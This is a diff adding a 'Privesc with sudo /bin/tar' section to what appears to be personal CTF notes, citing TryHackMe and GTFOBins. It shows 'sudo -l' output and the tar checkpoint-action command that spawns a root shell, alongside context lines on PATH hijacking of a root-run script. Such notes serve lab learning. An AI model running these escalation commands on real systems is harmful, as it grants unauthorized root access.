@@ -63,3 +63,27 @@ m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
 ```
 m4lwhere@previse:/tmp$ sudo -u root /opt/scripts/access_backup.sh
 ```
+
+
+##  Privesc with sudo /bin/tar
+
+ref:- https://tryhackme.com/room/cowboyhacker
+
+```bash
+lin@bountyhacker:~/Desktop$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+
+```
+
+gtfobin:- https://gtfobins.github.io/gtfobins/tar/#sudo
+
+```bash
+lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# 
+```
